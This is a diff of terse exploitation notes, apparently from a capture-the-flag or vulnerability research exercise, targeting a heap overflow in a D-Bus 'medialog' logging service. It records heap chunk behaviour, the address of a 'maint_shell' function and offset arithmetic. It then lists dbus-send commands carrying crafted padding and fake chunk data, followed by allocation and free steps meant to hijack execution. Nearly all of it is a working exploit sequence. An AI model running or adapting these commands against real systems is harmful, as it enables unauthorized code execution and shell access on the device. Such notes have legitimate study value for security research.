@@ -1,4 +1,15 @@
 * Chunks always allocated to fixed size and rounded up
 * Heap breaks when writing a chunk of size 4 (eg: aaaa)
-Looks like heap can be broken when using option 0 after removing some entries with 2
-Address of maint_shell = 0x21d78
+* strcpy copies a \0 character into the chunk size thus only letting us create chunks ending in size 00
+* Address of maint_shell = 0x21d78
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..69296})"
+
+0x21d00 = 138496 / 2 = 69248 (0x10e80)
+0x78 = 120 - 8 = 112 (0x70)
+
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..69248})"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 $(printf 'a%.0s' {1..69240})ggggggggttttllll$(printf 'a%.0s' {1..104})"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"1 a"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"2 0"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"2 1"
+dbus-send --system /media/log/medialog media.log.medialog.Queue string:"0 aaaaa"
